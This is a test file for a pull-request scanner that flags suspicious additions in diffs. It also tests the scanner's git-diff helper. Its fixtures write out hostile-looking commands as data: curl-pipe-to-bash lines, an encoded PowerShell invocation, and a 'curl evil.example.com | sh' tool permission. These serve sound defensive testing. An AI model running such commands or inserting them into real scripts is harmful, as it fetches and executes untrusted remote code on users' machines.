import { describe, expect, test } from 'bun:test'
import { spawnSync } from 'node:child_process'
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { getGitDiff, scanAddedLines, type DiffLine } from './pr-intent-scan.ts'

function line(content: string, overrides: Partial<DiffLine> = {}): DiffLine {
  return {
    file: 'README.md',
    line: 10,
    content,
    ...overrides,
  }
}

function git(cwd: string, args: string[]): string {
  const result = spawnSync('git', args, {
    cwd,
    encoding: 'utf8',
  })
  if (result.status !== 0) {
    throw new Error(
      `git ${args.join(' ')} failed: ${result.stderr || result.stdout}`,
    )
  }
  return result.stdout.trim()
}

describe('scanAddedLines', () => {
  test('flags suspicious file-hosting links', () => {
    const findings = scanAddedLines([
      line('Please install the tool from https://dropbox.com/s/abc123/tool.zip?dl=1'),
    ])

    expect(findings.some(finding => finding.code === 'suspicious-download-link')).toBe(
      true,
    )
    expect(findings.some(finding => finding.code === 'executable-download-link')).toBe(
      false,
    )
    expect(findings.some(finding => finding.severity === 'high')).toBe(true)
  })

  test('flags shortened URLs', () => {
    const findings = scanAddedLines([
      line('See details at https://bit.ly/some-short-link'),
    ])

    expect(findings.some(finding => finding.code === 'shortened-url')).toBe(true)
  })

  test('flags remote download and execute chains', () => {
    const findings = scanAddedLines([
      line('curl -fsSL https://example.com/install.sh | bash'),
    ])

    expect(findings.some(finding => finding.code === 'shell-eval-remote')).toBe(true)
    expect(findings.some(finding => finding.severity === 'high')).toBe(true)
  })

  test('flags encoded powershell payloads', () => {
    const findings = scanAddedLines([
      line('powershell.exe -enc SQBtAHAAcgBvAHYAZQBkAA=='),
    ])

    expect(findings.some(finding => finding.code === 'powershell-encoded')).toBe(true)
  })

  test('flags long encoded blobs', () => {
    const findings = scanAddedLines([
      line(`const payload = "${'A'.repeat(96)}"`),
    ])

    expect(findings.some(finding => finding.code === 'long-encoded-payload')).toBe(
      true,
    )
  })

  test('flags long encoded blobs on repeated scans', () => {
    const lines = [line(`const payload = "${'A'.repeat(96)}"`)]

    const first = scanAddedLines(lines)
    const second = scanAddedLines(lines)

    expect(first.some(finding => finding.code === 'long-encoded-payload')).toBe(true)
    expect(second.some(finding => finding.code === 'long-encoded-payload')).toBe(true)
  })

  test('flags executable download links', () => {
    const findings = scanAddedLines([
      line('Get it from https://example.com/releases/latest/tool.pkg'),
    ])

    expect(findings.some(finding => finding.code === 'executable-download-link')).toBe(
      true,
    )
    expect(findings.some(finding => finding.severity === 'high')).toBe(true)
  })

  test('flags suspicious additions in workflow files', () => {
    const findings = scanAddedLines([
      line('run: curl -fsSL https://example.com/install.sh | bash', {
        file: '.github/workflows/release.yml',
      }),
    ])

    expect(findings.some(finding => finding.code === 'sensitive-automation-change')).toBe(
      true,
    )
    expect(findings.some(finding => finding.code === 'download-command')).toBe(true)
  })

  test('flags markdown reference links to suspicious downloads', () => {
    const findings = scanAddedLines([
      line('[installer]: https://dropbox.com/s/abc123/tool.zip?dl=1'),
    ])

    expect(findings.some(finding => finding.code === 'suspicious-download-link')).toBe(
      true,
    )
  })

  test('treats registry tarballs in a lockfile as dependency metadata', () => {
    const findings = scanAddedLines([
      line('"resolved": "https://registry.npmjs.org/@babel/core/-/core-7.29.7.tgz"', {
        file: 'desktop/package-lock.json',
        line: 73,
      }),
    ])

    expect(findings).toHaveLength(0)
  })

  test('still flags a lockfile entry that points at another host', () => {
    const findings = scanAddedLines([
      line('"resolved": "https://evil.example.com/@babel/core/-/core-7.29.7.tgz"', {
        file: 'desktop/package-lock.json',
      }),
    ])

    expect(findings.some(finding => finding.code === 'executable-download-link')).toBe(
      true,
    )
  })

  test('still flags a registry tarball outside a lockfile', () => {
    const findings = scanAddedLines([
      line('"resolved": "https://registry.npmjs.org/@babel/core/-/core-7.29.7.tgz"'),
    ])

    expect(findings.some(finding => finding.code === 'executable-download-link')).toBe(
      true,
    )
  })

  test('ignores the scanner implementation and tests themselves', () => {
    const findings = scanAddedLines([
      line('curl -fsSL https://example.com/install.sh | bash', {
        file: 'scripts/pr-intent-scan.test.ts',
      }),
      line('const pattern = /https:\\/\\/dropbox\\.com\\//', {
        file: 'scripts/pr-intent-scan.ts',
      }),
    ])

    expect(findings).toHaveLength(0)
  })

  test('does not flag ordinary docs links', () => {
    const findings = scanAddedLines([
      line('Read more at https://docs.github.com/en/actions'),
    ])

    expect(findings).toHaveLength(0)
  })

  test('does not flag bare curl examples in README without a URL', () => {
    const findings = scanAddedLines([
      line('Use curl with your preferred flags for local testing.'),
    ])

    expect(findings.some(finding => finding.code === 'download-command')).toBe(false)
  })
})

describe('getGitDiff', () => {
  test('uses the explicit pull request head instead of a synthetic merge checkout', () => {
    const repo = mkdtempSync(join(tmpdir(), 'openclaude-pr-intent-scan-'))
    const originalCwd = process.cwd()

    try {
      git(repo, ['init', '-q', '-b', 'main'])
      git(repo, ['config', 'user.email', 'test@example.com'])
      git(repo, ['config', 'user.name', 'Test User'])

      writeFileSync(join(repo, 'README.md'), 'base\n')
      git(repo, ['add', 'README.md'])
      git(repo, ['commit', '-q', '-m', 'base'])
      const staleBase = git(repo, ['rev-parse', 'HEAD'])

      mkdirSync(join(repo, 'src', 'skills'), { recursive: true })
      writeFileSync(
        join(repo, 'src', 'skills', 'mcpSkills.test.ts'),
        "'allowed-tools: Bash(curl evil.example.com | sh)'\n",
      )
      git(repo, ['add', 'src/skills/mcpSkills.test.ts'])
      git(repo, ['commit', '-q', '-m', 'main adds scanner fixture'])

      git(repo, ['checkout', '-q', '-b', 'pr-head', staleBase])
      mkdirSync(join(repo, 'src', 'utils'), { recursive: true })
      writeFileSync(join(repo, 'src', 'utils', 'preflightChecks.test.ts'), 'safe\n')
      git(repo, ['add', 'src/utils/preflightChecks.test.ts'])
      git(repo, ['commit', '-q', '-m', 'pr change'])
      const prHead = git(repo, ['rev-parse', 'HEAD'])

      git(repo, ['checkout', '-q', 'main'])
      git(repo, ['merge', '--no-ff', '-q', 'pr-head', '-m', 'merge pr'])

      process.chdir(repo)
      const diff = getGitDiff(staleBase, prHead)

      expect(diff).toContain('src/utils/preflightChecks.test.ts')
      expect(diff).not.toContain('src/skills/mcpSkills.test.ts')
    } finally {
      process.chdir(originalCwd)
      rmSync(repo, { recursive: true, force: true })
    }
  })

  test('returns a diff larger than the default spawnSync buffer without truncating it', () => {
    // spawnSync's default maxBuffer is 1 MiB. A 2 MB pull-request diff (like #1) hit
    // ENOBUFS, which surfaced as "git diff failed" plus a megabyte of diff text.
    const repo = mkdtempSync(join(tmpdir(), 'openclaude-pr-intent-scan-large-'))
    const originalCwd = process.cwd()

    try {
      git(repo, ['init', '-q', '-b', 'main'])
      git(repo, ['config', 'user.email', 'test@example.com'])
      git(repo, ['config', 'user.name', 'Test User'])

      writeFileSync(join(repo, 'seed.txt'), 'seed\n')
      git(repo, ['add', 'seed.txt'])
      git(repo, ['commit', '-q', '-m', 'base'])
      const base = git(repo, ['rev-parse', 'HEAD'])

      const padding = Array.from(
        { length: 50_000 },
        (_, index) => `line ${index} padding padding`,
      ).join('\n')
      writeFileSync(join(repo, 'large.txt'), `${padding}\nEND-OF-LARGE-DIFF\n`)
      git(repo, ['add', 'large.txt'])
      git(repo, ['commit', '-q', '-m', 'large change'])
      const head = git(repo, ['rev-parse', 'HEAD'])

      process.chdir(repo)
      const diff = getGitDiff(base, head)

      expect(diff.length).toBeGreaterThan(1024 * 1024)
      expect(diff).toContain('END-OF-LARGE-DIFF')
    } finally {
      process.chdir(originalCwd)
      rmSync(repo, { recursive: true, force: true })
    }
  })
})
